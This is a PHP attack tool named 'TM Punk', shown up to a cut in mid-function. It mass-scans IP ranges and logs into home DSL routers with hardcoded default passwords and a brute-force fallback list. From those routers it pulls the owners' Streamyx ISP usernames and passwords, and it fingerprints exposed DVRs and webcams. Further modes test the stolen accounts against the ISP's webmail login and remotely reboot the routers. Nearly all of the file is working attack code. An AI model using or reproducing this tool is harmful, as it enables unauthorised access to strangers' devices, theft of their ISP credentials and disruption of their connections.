<?php

/**
 * Debug Mode
 *
 * @var string $debug_mode -> Set this to on if you want to debug this script otherwise off it.
 *
 * Sometime script can't run, just on this section to see the
 * error and fix it yourself. ;)
 */
$debug_mode = "off";

/**
 * @var string $year -> Set this php year.
 */
$year = "2013";

/**
 * @var string $version -> Set this php version :).
 */
$version = "0.8.2";

/**
 * @var string $release -> Set this script release date.
 * Note : Year-Day-Month
 */
$release = "2013-06-04";

/**
 * @var string $user_agent -> Set php user agent when trying to request data with curl :).
 */
$user_agent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11";

/**
 * @var string $author -> Author for this script ;).
 */
$author = "Mohd Shahril-AFnuM-Akif";

/**
 * @var bool $verbosa -> Set if you want to make verbose as default.
 */
$verbose = false;

if($debug_mode == "off"){
	error_reporting(0);
	set_time_limit(0);
	ini_set('error_log',NULL);
	ini_set('max_execution_time',0);
	ini_set('log_errors',0);
}

date_default_timezone_set('Asia/Kuala_Lumpur');  // Here is need for new PHP Version.

$il=0; // Use in save/log function

/**
 * CopyRighT ;)
 */
echo "\nTM Punk ".$version."  FuckCopyright (c) ".$year." ".$author." ".$release."\n";

/**
 * Version
 * @content string -> Give note for what you have done to this script.
 */
if($argv[1] == "-v"){
	die("
Version 0.1 :-
- Base Code Written..
- Only can detect what router user use only.

Version 0.2 :-
- Add automatik login code into D-Link, Innacom and Zyxel.

Version 0.3 :-
- Add save into log function (Thank to Akif)
- More interactive help.

Version 0.4 :-
- Add ASUS DSL-N12U automatic login code.
- Add multiple verification if default verification fail.

Version 0.5 :-
- Change Curl User Agent into Chrome 23.
- Add Streamyx Account Validation Scanner to check if that streamyx account
  can login into streamyx web mail.
- Add TP-Link automatic login code.

Version 0.6 :-
- Add User Limit (user can now get what limit of downstream that user want).
- Fix mistake when getting downstream/upstream on TP-Link TD-W8901G (i don't believe i make that mistake!)

Version 0.7 :-
- Add Router Reboot function (D-Link, Innacom and TP-Link only !);

Version 0.7.1 :-
- Add Router Reboot function for Zyxel.

Version 0.8 :-
- Add verbose mode.

Version 0.8.1 :-
- Add Optional Info.

Version 0.8.2 :-
- Add ping timeout.

Thank to : Akif (for log function) and other people who support.
		");
}

/**
 * Check if user input "-reboot" perimeter in this script.
 * If "-rebot" exist, then check for it value.
 * If the value can be accepted, then check data for that IP address
 * If this script can connect into that router, so this script automatically reboot that router.
 */
if(in_array("-reboot", $argv, true)){
	$key = array_search("-reboot", $argv);
	$value = $key + 1;
	$ip = $argv[$value];
	if(!filter_var($ip, FILTER_VALIDATE_IP)){ echo "\nIncorrect IP Address Format\n";die(); }
	if(check($ip) != TRUE){ echo "\nIP address ".$ip." didn't exist :(\n";die(); }
	$data = curl($ip);
	$info_return = checkdata($data);
	if($info_return == "Innacom"){
		$result = innacom_reboot($ip);
		if($result == true){
			echo "\n".$ip." is rebooting now !\n";die();
		}else{
			echo "\nError when trying to reboot Router at ".$ip."!\n";die();
		}
	}elseif($info_return == "D-Link"){
		if(strpos($data, "SEA_1.01")){ $result = dlink_reboot($ip, "SEA_1.01"); }else{ $result = dlink_reboot($ip, ""); }
		if($result == true){
			echo "\n".$ip." is rebooting now !\n";die();
		}else{
			echo "\nError when trying to reboot Router at ".$ip."!\n";die();
		}
	}elseif($info_return == "TP-Link TD-W8901G"){
		$result = TpLink_reboot($ip);
		if($result == true){
			echo "\n".$ip." is rebooting now !\n";die();
		}else{
			echo "\nError when trying to reboot Router at ".$ip."!\n";die();
		}
	}elseif($info_return == "Zyxel P-600"){
		$result = zyxel_reboot($ip);
		if($result == true){
			echo "\n".$ip." is rebooting now !\n";die();
		}else{
			echo "\nError when trying to reboot Router at ".$ip."!\n";die();
		}
	}else{
		echo "\nCan't determine what Router for ".$ip." :(\n";die();
	}
}

/**
 * Check if user input "-limit" perimeter in this script.
 * If "-limit" exist, then check for it value.
 * If the value can be accepted, then set $limit_bool into "set"
 * If value can't be accepted, then this script will automatic exit with error message
 */
if(in_array("-limit", $argv, true)){
	$find_key = array_search("-limit", $argv);
	$limit_value = $find_key + 1;
	if(strtolower($argv[$limit_value]) == "4mb"){
		$limit_bool = "set";
	}elseif(strtolower($argv[$limit_value]) == "2mb"){
		$limit_bool = "set";
	}elseif(strtolower($argv[$limit_value]) == "8mb"){
		$limit_bool = "set";
	}else{
		echo "\nMake sure limit perimeter is 4mb or 2mb !\n";
		echo "Exiting!\n";
		sleep(1);
		die();
	}
}

/**
 * If user make $verbose as false in default
 * User can make it true back using command line argument
 */
if(in_array("-verbose", $argv, true)){
	$verbose = true;
}else{
	$verbose = false;
}

/**
 * If user want TM Punk to show optional info.
 * Then this is section of it :)
 */
if(in_array("-g", $argv, true)){
	$optional = true;
}else{
	$optional = false;
}

/**
 * Streamyx Account Validation Scanner
 *
 * First, this section will check if local computer has internet.
 * If internet didn't exist, then automatic exit with error message.
 * If internet exist, then continue, then script will look into provide log.
 * Then will make request one per one into streamyx webmail using curl request.
 * If respond is good, then username/password is accepted.
 */
if($argv[1] == "-c"){
	
	if(!check("http://google.com/")){
		echo "\nYour computer look like didn't have internet connection !\n";
		echo "Internet is important if u want to use this service\n";
		echo "Exiting...\n";
		sleep(1);
		die();
	}
	
	if(empty($argv[2])) { die("\nPlease enter your log file\n"); }
	if(!file_exists($argv[2])) { echo "\nFile ".$argv[2]." can't be found\n";die(); }
	$getfile = file_get_contents($argv[2]);
	if($verbose){
		echo "\nGet content from ".$argv[2]." file\n";
	}
	$simpan = explode("Streamyx User : ", $getfile);
	foreach($simpan as $one){
		$data = explode("\n", $one);
		$tmp_p = explode("Streamyx Pass :", $data[1]);
		$tmp_u = explode("@", trim($data[0]));
		$username = trim($tmp_u[0]);
		$password = trim($tmp_p[1]);
		$post = "Login.Token1=".$username."&org=streamyx.com&Login.Token2=".$password."&Login=Log+In&module=LDAP&channelName=Login";
		$url = "http://webmail.tm.net.my/amserver/UI/Login";
		if($verbose){
			echo "Trying to connect with TM Mail Server...\n\n";
		}
		$tmp = curl($url, "", $post);
		if(strpos($tmp, "postprocess")){
			echo "\nEmail Username : ".$username."@streamyx\n";
			echo "Email Password : ".$password."\n";
		}else{
			if($verbose){
				echo "Fail when parse username and password to TM Mail Server\n";
			}
		}
	}
	die();
}
	

/**
 * Help File
 */
 
if($verbose){
	$verbose_check = "On";
}else{
	$verbose_check = "Off";
}
 
if(!isset($argv[1]) || $argv[1] == "-help" || $argv[1] == "-h" || $argv[1] == "/?"){
	die("
 USAGE :
 php \"{$argv[0]}\" <ip> <range> (optional) -save <filename>
 php \"{$argv[0]}\" -c <filename>
 php \"{$argv[0]}\" <ip> <range> -limit \"4m\"
 php \"{$argv[0]}\" <ip> <range> -save -limit \"2m\"
 php \"{$argv[0]}\" -reboot <ip>
 
 OPTIONS : 
 <ip>	 : Specific target IP.
 <range> : Range scanner need to scan.
 
 OPTIONAL :
 -g : Get optional info that you must know :)
 -save <filename> : Save result in specific file.
 -c <filename> : Check streamyx account if that account can use in 
                 streamyx mail system.
 -v : Show what version of TM Punk you have now.
 -limit <speed> : Filter output from result. (In 2mb,4mb & 8mb).
 -reboot <ip> : Automatically reboot those router ;).
 -verbose : Verbose Mode. (Default = ".$verbose_check.")
		");
}

/**
 * Base Code
 *
 * This will be long, but I will try explain it :P.
 * First, this script will check user input (ip address) in argument 1.
 * If IP is accepted, then continue.
 * After that, it will check for user input (range) in argument 2.
 * If accepted, then continue.
 * Then this php will split the IP address and re-arrange it with user range.
 * After that, this script will start looping with provide user range.
 * Then PHP call another function to check data in looping IP address one by one.
 * If data is equal with function that been provide, then PHP will check user limit.
 * *- User limit is optional, you doesn't need to provide it if you don't want to limit anything.
 * *- If downstream of data is equal with user limit, then show the username/password/upstream/downstream.
 * If user doesn't provide any user limit, then php will show normally.
 * Any IP that doesn't equal with any data in provide function, then PHP will show IP with no result.
 * Then above process will do again and again until range is complete.
 */
if(isset($argv[1]) && isset($argv[2])){	
	$streamyx_ip = $argv[1];
	if(!filter_var($streamyx_ip, FILTER_VALIDATE_IP)){ echo "\nIncorrect IP Address Format\n";die(); }
	if(strpos($argv[2], "-")){
		$range = explode("-", $argv[2]);
	}else{
		echo "\nIncorrect Range Format\n";die();
	}
	if($range[1] > 255){
		echo "\nIncorrect Range Format\n";die();
	}
	$a = explode(".", $streamyx_ip);
	if($verbose){
		echo "\nTry to parse IP address to valit input\n";
	}
	$a = $a[0].".".$a[1].".".$a[2];
	echo "\nScanning ".$a.".".$argv[2]."... \n\n";
	$b = explode("-", $argv[2]);
	$ole=range ($b[0],$b[1]);
	$ol=count($ole);
	$give = "Status : Scan started for IP range ".$a.".".$argv[2]."... \r\n\r\n";
	if(isset($argv[3]) && $argv[3] == "-save"){
		makelog($give, $argv[4]);
	}
	for($i = $range[0]; $i <= $range[1]; $i++){
		if($verbose){
			echo "Checking for ".$a.".".$i." if online\n";
		}
		if(check($a.".".$i)){
			$data = curl($a.".".$i, "", "");
			if($verbose){
				echo "Checking data for ".$a.".".$i."\n";
			}
			$data_return = checkdata($data, $a.".".$i);
			if($data_return == "Innacom")
			{
				$tunjuk = Innacom($a.".".$i);
				if(isset($limit_bool) && $limit_bool == "set"){
					$downstream = getdownstream($tunjuk);
					if(limit($downstream, $argv[$limit_value])){
						$il++;
						echo $a.".".$i." is ".$data_return."\n";
						echo "Ping time : ".ping($a.".".$i)."\n";
						echo $tunjuk;
						echo "\n";
					}
				}else{
					$il++;
					echo $a.".".$i." is ".$data_return."\n";
					echo "Ping time : ".ping($a.".".$i)."\n";
					echo $tunjuk;
					echo "\n";
				}
			}
			elseif($data_return == "ASUS DSL-N12U")
			{
				$tunjuk = asus($a.".".$i);
				if(isset($limit_bool) && $limit_bool == "set"){
					$downstream = getdownstream($tunjuk);
					if(limit($downstream, $argv[$limit_value])){
						$il++;
						echo $a.".".$i." is ".$data_return."\n";
						echo "Ping time : ".ping($a.".".$i)."\n";
						echo $tunjuk;
						echo "\n";
					}
				}else{
					$il++;
					echo $a.".".$i." is ".$data_return."\n";
					echo "Ping time : ".ping($a.".".$i)."\n";
					echo $tunjuk;
					echo "\n";
				}
			}
			elseif($data_return == "TP-Link TD-W8901G")
			{
				$tunjuk = TpLink($a.".".$i);;
				if(isset($limit_bool) && $limit_bool == "set"){
					$downstream = getdownstream($tunjuk);
					if(limit($downstream, $argv[$limit_value])){
						$il++;
						echo $a.".".$i." is ".$data_return."\n";
						echo "Ping time : ".ping($a.".".$i)."\n";
						echo $tunjuk;
						echo "\n";
					}
				}else{
					$il++;
					echo $a.".".$i." is ".$data_return."\n";
					echo "Ping time : ".ping($a.".".$i)."\n";
					echo $tunjuk;
					echo "\n";
				}
			}
			elseif($data_return == "D-Link")
			{	
				if(strpos($data, "SEA_1.01")){
					$tunjuk = dlink($a.".".$i, "SEA_1.01");
				}else{
					$tunjuk = dlink($a.".".$i, "");
				}
				if(isset($limit_bool) && $limit_bool == "set"){
					$downstream = getdownstream($tunjuk);
					if(limit($downstream, $argv[$limit_value])){
						$il++;
						echo $a.".".$i." is ".$data_return."\n";
						echo "Ping time : ".ping($a.".".$i)."\n";
						echo $tunjuk;
						echo "\n";
					}
				}else{
					$il++;
					echo $a.".".$i." is ".$data_return."\n";
					echo "Ping time : ".ping($a.".".$i)."\n";
					echo $tunjuk;
					echo "\n";
				}
			}
			elseif($data_return == "Zyxel P-600")
			{	
				$tunjuk = zyxel($a.".".$i);
				if(isset($limit_bool) && $limit_bool == "set"){
					$downstream = getdownstream($tunjuk);
					if(limit($downstream, $argv[$limit_value])){
						$il++;
						echo $a.".".$i." is ".$data_return."\n";
						echo "Ping time : ".ping($a.".".$i)."\n";
						echo $tunjuk;
						echo "\n";
					}
				}else{
					$il++;
					echo $a.".".$i." is ".$data_return."\n";
					echo "Ping time : ".ping($a.".".$i)."\n";
					echo $tunjuk;
					echo "\n";
				}
			}
			else
			{
				if(isset($data_return)){
					if($optional){
						echo $a.".".$i." is ".$data_return."\n";
						$il++;
						$give = "IP : $a.$i \r\nDevice : ".$data_return."\r\nStatus : Method not implemented\r\n\r\n";
						if(isset($argv[3]) && $argv[3] == "-save"){
							makelog($give, $argv[4]);
						}
						echo "\n";
					}
				}else{
					if($optional){
						$il++;
						echo $a.".".$i." exist but no data for this IP\n";
							$give = "IP : $a.$i \r\nDevice : unknown\r\nStatus : Unknown device\r\n\r\n";
							if(isset($argv[3]) && $argv[3] == "-save"){
								makelog($give, $argv[4]);
							}
						echo "\n";
					}
				}
			}
		}
		if($verbose){
			echo $a.".".$i." if not exist or offline\n\n";
		}
	}
	$give = "Status : Scan ended.. total there are ".$il." IPs accessible out of ".$ol." IPs on range. \r\n\r\n";
	echo $give;
	if(isset($argv[3]) && $argv[3] == "-save"){
		makelog($give, $argv[4]);
	}
	die();
}

/**
 * List of another verification if default verification is fail.
 * Note : username => password
 */
$list = array(
		"admin" => "tmadmin",
		"tmadmin" => "admin",
		"admin" => "admin",
	  	"tmuser" => "tmuser",
	  	"tmbusiness" => "tmbusiness",
	  	"tmuser" => "tmbusiness",
	  	"tmadmin" => "tmbusiness",
		"support" => "support"
	  );

/**
 * @param string $url -> Check if host exist in port 80.
 * @return bool -> Return true if host exist.
 */
function check($url){
	global $verbose;
	if($verbose){
		echo "Trying to connect with ".$url."\n";
	}
	$ch=curl_init();
	curl_setopt($ch,CURLOPT_URL,$url );
	curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch,CURLOPT_VERBOSE,false);
	curl_setopt($ch,CURLOPT_TIMEOUT, 1);
	curl_setopt($ch,CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch,CURLOPT_SSLVERSION,3);
	curl_setopt($ch,CURLOPT_SSL_VERIFYHOST, FALSE);
	$page=curl_exec($ch);
	$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	curl_close($ch);
	//return $httpcode;
	if($verbose){
		echo "Router in ".$url." return this code -> ".$httpcode."\n";
	}
	if($httpcode>=200 && $httpcode<402) return true;
	else return false;
}

/**
 * @param string $data -> ry to check other data after script can't detect any Router there
 * @return string -> Return Router data.
 */
function checkdata($data, $ip = ""){

	if(strpos($data, "parent.location=")){ // For IP that move to other location ;)
		$pecah = explode("parent.location='", $data);
		$pecah = explode("'", $pecah[1]);
		$get = curl($pecah[0], "", "");
		if(strpos($get, "Innacom")){
			return "Innacom";
		}elseif(strpos($get, "logo_dlink.jpg")){
			return "DSL-2640B Wireless Router";
		}
	}elseif(strpos($data, "<A HREF='/login.rsp'>here</a></")){
		$pecah = cutstr($data, "HREF='", "'");
		$get = curl($ip.$pecah);
		if(strpos($get, "DVR LOGIN")){
			return "DVR LOGIN";
		}
	}elseif(strpos($data, "Asus")){
		return "ASUS DSL-N12U";
	}elseif(strpos($data, "TD-W8901G")){
		return "TP-Link TD-W8901G";
	}elseif(strpos($data, "D-Link")){
		return "D-Link";
	}elseif(strpos($data, "TM6841G")){
		return "Zyxel P-600";
	}elseif(strpos($data, "DVR remote management sytem")){
		return "DVR remote management system";
	}elseif(strpos($data, "IP Surveillance")){
		return "IP Surveillance System";
	}elseif(strpos($data, "Net Viewer D6 Series Web-Program")){
		return "Net Viewer D6 Series Web-Program";
	}elseif(strpos($data, "16 CH")){
		return "16 CH (camera surveillance maybe ? :] )";
	}elseif(strpos($data, "DVR Components Download")){
		return "DVR Web Client/Camera";
	}elseif(strpos($data, '<img src="images/user.gif" width="32" height="48"></TD>')){
		return "Web Camera";
	}elseif(strpos($data, "DVR LOGIN")){
		return "DVR Camera Login";
	}elseif(strpos($data, "PC DVR Web Client")){
		return "PC DVR Web Client";
	}elseif(strpos($data, "IDS_WEB_WEBCAM_LOGIN")){
		return "Webcam Login";
	}elseif(strpos($data, "NETSuveillance WEB")){
		return "NETSuveillance WEB";
	}elseif(strpos($data, "DSL Router")){
		return "DSL Router";
	}elseif(strpos($data, 'id="btnLive" onClick="openLive()"')){
		return "Remote Monitoring System";
	}elseif(strpos($data, "TD-W8961ND")){
		return "TP-Link TD-W8961ND";
	}elseif(strpos($data, "Web Application Manager")){
		return "Web Application Manager";
	}elseif(strpos($data, "BP Software")){
		return "BP Software";
	}elseif(strpos($data, "BattleLAN Network")){
		return "BattleLAN Network";
	}elseif(strpos($data, "WebDVR")){
		return "WebDVR";
	}
}

/**
 * @param string $string -> Remove Curly Bracket from String
 */
function removecurly($string){
	$remove = str_replace("{", "", $string);
	$remove = str_replace("}", "", $remove);
	return $remove;
}

/**
 * Innacom function by AFnuM
 * @param string $ip -> Get ip then automatically get streamyx user info.
 * @return string -> Return streamyx user info.
 */
function Innacom($ip)
{
 if(isset($ip))
 {
	global $list;
	global $verbose;
	
	$result = ""; 
  
  if($verbose){
	$result .= "Try to connect to Innacom router with default username & password\n";
  }
  $curl = curl("http://".$ip."/login.cgi?username=support&psd=support", "", "");
  
  //Using another verification
  if(strpos("Authentication fail", $curl)){
	if($verbose){
		$result .= "Default authentication fail, try with another\n";
	}
	  foreach($list as $username => $pass){
		  $curl = curl("http://".$ip."/login.cgi?username=".$username."&psd=".$pass."", "", "");
		  if(strpos("Authentication fail", $curl) === FALSE){
			if($verbose){
				$result .= "All authentication was failed!\n";
			}
			break;
		  }
	  }
  }
  
  if($verbose){
	$result .= "Authentication success ! Try to take data now !\n";
  }
  $cook = GetCookies($curl);
  $curl = curl("http://".$ip."/wancfg.cmd", $cook, "");
  $curl1 = curl("http://".$ip."/info.html", $cook, "");
  preg_match_all("/var obj2Items = '(.*)';/U", $curl, $f);
  preg_match_all("/var obj1Items = '(.*)';/U", $curl1, $f1);
  $exp = explode("-", $f[1][0]);
  $exp1 = explode("-", $f1[1][0]);
  if(!empty($exp[12]) && !empty($exp[13]))
  {
   $result .= "Streamyx User : ".removecurly($exp[12])."\n";
   $result .= "Streamyx Pass : ".removecurly($exp[13])."\n";
  }
  if(!empty($exp1[10]) && !empty($exp1[11]))
  {
   $result .= "Upstream : ".str_replace("000", "", removecurly($exp1[10]))."\n";
   $result .= "Downstream : ".str_replace("000", "", removecurly($exp1[11]))."\n";
  }
  else return false;
  
  if($verbose){
	$result .= "Take data success ! \n";
  }
  
  return $result;
  
  if(isset($argv[3]) && $argv[3] == "-save"){
		makelog("IP : $ip \r\nRouter : Innacomm\r\nStreamyx User : ".removecurly($exp[12])."\r\n"."Streamyx Pass : ".removecurly($exp[13])."\r\nUpstream : ".str_replace("000", "", removecurly($exp1[10]))."\r\nDownstream : ".str_replace("000", "", removecurly($exp1[11]))."\r\n\r\n", $argv[4]);
	}
 }
}

/**
 * Innacom Reboot by Shahril
 * @param string $ip -> Get ip then automatically reboot the Router.
 * @return bool -> Return bool result info.
 */
function innacom_reboot($ip){

	global $list;
	global $verbose;

	//Login into Router
	if($verbose){
		echo "Try to connect to Innacom router with default username & password\n";
	}
	$curl = curl("http://".$ip."/login.cgi?username=support&psd=support", "", "");
	
	//Using another verification
	if(strpos("Authentication fail", $curl)){
		if($verbose){
			echo "Default authentication fail, try with another\n";
		}
		foreach($list as $username => $pass){
			$curl = curl("http://".$ip."/login.cgi?username=".$username."&psd=".$pass."", "", "");
			if(strpos("Authentication fail", $curl) === FALSE){
				if($verbose){
					echo "All authentication was failed!\n";
				}
				break;
			}
		}
	}
	
	if($verbose){
		echo "Authentication success ! Try to reboot that router now !\n";
	}
	$cook = GetCookies($curl);
	$reboot = curl("http://".$ip."/rebootinfo.cgi", $cook);
	if(strpos($reboot, "Router is rebooting")){ return true; }else{ return false; }
}

/**
 * D-Link function by Shahril
 * @param string $ip -> Get ip then automatically get streamyx user info.
 * @param string $type -> Check Router type.
 * @return string -> Return streamyx user info.
 */
function dlink($ip, $type){
	
	global $list;
	global $verbose;
	
	$result = "";

	if($type == "SEA_1.01") { $User = "admin"; }else{ $User = "tmadmin"; }
	
	//Login into Router
	if($verbose){
		$result .= "Try to connect to DLink router with default username & password\n";
	}
	$login = curl("http://".$ip."/index.html", "username=".$User.";password=tmadmin", "username=".$User."&password=tmadmin&loginfo=on");
	
	//Using another verification
	if(strpos("auth_fail.html", $login)){
		if($verbose){
			$result .= "Default authentication fail, try with another\n";
		}
	  foreach($list as $username => $pass){
		  $login = curl("http://".$ip."/index.html", "username=".$User.";password=".$pass, "username=".$User."&password=".$pass."&loginfo=on");
		  if(strpos("auth_fail.html", $login) === FALSE){
			if($verbose){
				$result .= "All authentication was failed!\n";
			}
			break;
		  }
	  }
	}
	
	if($verbose){
		$result .= "Authentication success ! Try to take data now !\n";
	}
	
	// Find Username & Password
	$data = curl("http://".$ip."/internet_js.html", "username=".$User."; password=tmadmin" , "");
	$data = explode("pppUserName.value = '", $data);
	$username = explode("';", $data[1]);
	$password = explode("pppPassword.value = '", $username[1]);
	//
	
	//Find Upstream & Downstream
	$data1 = curl("http://".$ip."/info.html", "username=".$User."; password=tmadmin" , "");
	$data1 = explode('Downstream Line Rate (Kbps):', $data1);
	$data1 = explode('document.write("<td>', $data1[1]);
	$downstream = explode('</td>");', $data1[1]);
	$upstream = explode('</td>");', $data1[2]);
	//
	
	//Variable for data
	$dl_user = $username[0];
	$dl_pass = $username[1];
	$dl_up = trim($upstream[0]);
	$dl_down = trim($downstream[0]);
	
	if(!empty($dl_user) && !empty($dl_pass)){
		$result .= "Streamyx User : ".$username[0]."\n";
		$result .= "Streamyx Pass : ".$password[1]."\n";

	}
	if(!empty($dl_up) && !empty($dl_down)){
		$result .= "Upstream : ".trim($upstream[0])."\n";
		$result .= "Downstream : ".trim($downstream[0])."\n";
	}
	
	if($verbose){
		$result .= "Take data success ! \n";
	}
	
	return $result;
	if(isset($argv[3]) && $argv[3] == "-save"){
		makelog ("IP : $ip \r\nRouter : D-Link Streamyx\r\nStreamyx User : $dl_user\r\n"."Streamyx Pass : $dl_pass\r\nUpstream : $dl_up\r\nDownstream : $dl_down\r\n\r\n", $argv[4]);
	}
}

/**
 * DLink Reboot by Shahril
 * @param string $ip -> Get ip then automatically reboot the Router.
 * @return bool -> Return bool result info.
 */
function dlink_reboot($ip, $type){

	global $list;
	global $verbose;

	if($type == "SEA_1.01") { $User = "admin"; }else{ $User = "tmadmin"; }
	
	//Login into Router
	if($verbose){
		$result .= "Try to connect to DLink router with default username & password\n";
	}
	$login = curl("http://".$ip."/index.html", "username=".$User.";password=tmadmin", "username=".$User."&password=tmadmin&loginfo=on");
	
	//Using another verification
	if(strpos("auth_fail.html", $login)){
		if($verbose){
			$result .= "Default authentication fail, try with another\n";
		}
	  foreach($list as $username => $pass){
		  $login = curl("http://".$ip."/index.html", "username=".$User.";password=".$pass, "username=".$User."&password=".$pass."&loginfo=on");
		  if(strpos("auth_fail.html", $login) === FALSE){
			if($verbose){
				$result .= "All authentication was failed!\n";
			}
			break;
		  }
	  }
	}
	
	//Send request to reboot Router
	if($verbose){
		echo "Authentication success ! Try to reboot that router now !\n";
	}
	$reboot = curl("http://".$ip."/rebootinfo.cgi", "username=".$User."; password=tmadmin" , "");
	if(strpos($reboot, "Please wait...")){ return true; }else{ return false; }
}

/**
 * Zyxel P-600 function by Shahril
 * @param string $ip -> Get ip then automatically get streamyx user info.
 * @return string -> Return streamyx user info.
 */
function zyxel($ip){
	
	global $list;
	global $verbose;
	
	$result = "";
	

	//Login into Router
	if($verbose){
		$result .= "Try to connect to ZyXel router with default username & password\n";
	}
	$login = curl("http://".$ip."/Forms/rpAuth_1", "", "LoginUsername=tmadmin&LoginPassword=ZyXEL ZyWALL Series&hiddenPassword=".md5("tmadmin")."&Prestige_Login=Login", "");
	
	//Using another verification
	if(strpos("rpAuth.html", $login)){
		if($verbose){
			$result .= "Default authentication fail, try with another\n";
		}
	  foreach($list as $username => $pass){
		  $login = curl("http://".$ip."/Forms/rpAuth_1", "", "LoginUsername=".$username."&LoginPassword=ZyXEL ZyWALL Series&hiddenPassword=".md5($pass)."&Prestige_Login=Login", "");
		  if(!strpos("rpAuth.html", $login)){
			if($verbose){
				$result .= "All authentication was failed!\n";
			}
			break;
			}
	  }
	}
	
	// Find Username & Password
	if($verbose){
		$result .= "Authentication success ! Try to take data now !\n";
	}
	$data = curl("http://".$ip."/wzWAN_ManualCfg.html", "", "");
	$data = explode('name="wzWAN_TUserName" size="30" maxlength="70" value="', $data);
	$username = explode('" /></font>', $data[1]);
	$data = explode('name="wzWAN_TPassword" size="30" maxlength="70" value="', $username[1]);
	$password = explode('" /></td></tr><td', $data[1]);
	//
	
	//Find Upstream & Downstream
	$data1 = curl("http://".$ip."/home.html", "", "", "http://".$ip."/");
	$data1 = explode('<td>DSL</td>', $data1);
	$speed_data = explode('</td><td>', $data1[1]);
	$speed_data = explode('</td></tr>', $speed_data[1]);
	$speed_data = explode('kbps /', $speed_data[0]);
	//
	
	if(!empty($username[0]) && !empty($password[0])){
		$result .= "Streamyx User : ".$username[0]."\n";
		$result .= "Streamyx Pass : ".$password[0]."\n";
	}
	if(!empty($speed_data[0]) && !empty($speed_data[1])){
		$result .= "Upstream : ".trim(str_replace("kbps", "", $speed_data[1]))."\n";
		$result .= "Downstream : ".trim($speed_data[0])."\n";
	}
	
	if($verbose){
		$result .= "Take data success ! \n";
	}
	
	return $result;
	
	if(isset($argv[3]) && $argv[3] == "-save"){
		makelog ("IP : $ip \r\nRouter : Zyxel P-600\r\nStreamyx User : ".$username[0]."\r\n"."Streamyx Pass : ".$password[0]."\r\nUpstream : ".trim(str_replace("kbps", "", $speed_data[1]))."\r\nDownstream : ".trim(str_replace("kbps", "", $speed_data[0]))."\r\n\r\n", $argv[4]);
	}
}

/**
 * Zyxel Reboot by Shahril
 * @param string $ip -> Get ip then automatically reboot the Router.
 * @return bool -> Return bool result info.
 */
function zyxel_reboot($ip){
	
	global $list;
	global $verbose;
	
	//Login into Router
	if($verbose){
		$result .= "Try to connect to ZyXel router with default username & password\n";
	}
	$login = curl("http://".$ip."/Forms/rpAuth_1", "", "LoginUsername=tmadmin&LoginPassword=ZyXEL ZyWALL Series&hiddenPassword=".md5("tmadmin")."&Prestige_Login=Login", "");
	
	//Using another verification
	if(strpos("rpAuth.html", $login)){
		if($verbose){
			$result .= "Default authentication fail, try with another\n";
		}
	  foreach($list as $username => $pass){
		  $login = curl("http://".$ip."/Forms/rpAuth_1", "", "LoginUsername=".$username."&LoginPassword=ZyXEL ZyWALL Series&hiddenPassword=".md5($pass)."&Prestige_Login=Login", "");
		  if(!strpos("rpAuth.html", $login)){
			if($verbose){
				$result .= "All authentication was failed!\n";
			}
			break;
		  }
	  }
	}
	
	if($verbose){
		echo "Authentication success ! Try to reboot that router now !\n";
	}
	$data_send = "Q29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5SXEyOW5rWEJ2MTJLajhoNg==";
	$data = curl("http://".$ip."/Forms/rpSysReboot_1", "", "", "", base64_decode($data_send));
	
	if(strpos($data, "RebootSuccPrev")){
		$data = curl("http://".$ip."/RebootSuccPrev.html");
		$data = curl("http://".$ip."/RebootSucc.html");
		return true;
	}else{
		return false;
	}
}

/**
 * ASUS DSL-N12U function by Shahril
 * @param string $ip -> Get ip then automatically get streamyx user info.
 * @return string -> Return streamyx user info.
 */
function asus($ip){
	
	global $list;
	global $verbose;
	
	$result = "";

	//Login into Router and take data
	if($verbose){
		$result .= "Try to connect to Asus router with default username & password\n";
	}
	$login = curl("http://".$ip."/Edit_Advanced_DSL_WAN_Config.asp?pvcindex=0&internetpvc=1", "", "", "admin:admin");

	//Using another verification
	if(strpos("401 Unauthorized", $login)){
		if($verbose){
			$result .= "Default authentication fail, try with another\n";
		}
		foreach($list as $username => $pass){
			$login = curl("http://".$ip."/Edit_Advanced_DSL_WAN_Config.asp?pvcindex=0&internetpvc=1", "", "", $username.":".$pass);
			if(strpos("401 Unauthorized", $login) === FALSE){
			if($verbose){
				$result .= "All authentication was failed!\n";
			}
			break;
			}
		}
	}
	
	//Find Username & Password
	if($verbose){
		$result .= "Authentication success ! Try to take data now !\n";
	}
	$data = cutstr($login, "DSLWANList", "]];");
	$username = cutstr($data, '"0", "0", "', '"');
	$password = cutstr($data , 'streamyx", "', '"');
	
	if(!empty($username) && !empty($password)){
		$result .= "Streamyx User : ".$username."\n";
		$result .= "Streamyx Pass : ".$password."\n";
	}
	
	if($verbose){
		$result .= "Take data success ! \n";
	}
	
	return $result;
	
	if(isset($argv[3]) && $argv[3] == "-save"){
		makelog ("IP : $ip \r\nRouter : ASUS DSL-N12U\r\nStreamyx User : ".$username."\r\n"."Streamyx Pass : ".$password."\r\n\r\n", $argv[4]);
	}
}

/**
 * TP-Link function by AFnuM
 * @param string $ip -> Get ip then automatically get streamyx user info.
 * @return string -> Return streamyx user info.
 */
function TpLink($ip){

	global $list;
	global $verbose;
	
	$result = "";

	//Login into Router and take data
	if($verbose){
		$result .= "Try to connect to TpLink router with default username & password\n";
	}
	$Bukak = curl("http://".$ip."/wizard/wizardPPP.htm", "", "", "admin:admin");
	
	//Using another verification
	if(strpos("401 Unauthorized", $Bukak)){
		if($verbose){
			$result .= "Default authentication fail, try with another\n";
		}
		foreach($list as $username => $pass){
			$Bukak = curl("http://".$ip."/wizard/wizardPPP.htm", "", "", $username.":".$password);
			if(strpos("401 Unauthorized", $Bukak) === FALSE){
			if($verbose){
				$result .= "All authentication was failed!\n";
			}
			break;
			}
		}
	}
	
	//Find Username & Password
	if($verbose){
		$result .= "Authentication success ! Try to take data now !\n";
	}
	preg_match_all('/NAME="Al_PPPUsername" (.*) VALUE="(.*)">/U', $Bukak, $Username);
	preg_match_all('/NAME="Al_PPPPassword" (.*) VALUE="(.*)">/U', $Bukak, $Password);
	
	// Find DownStream & UpStream
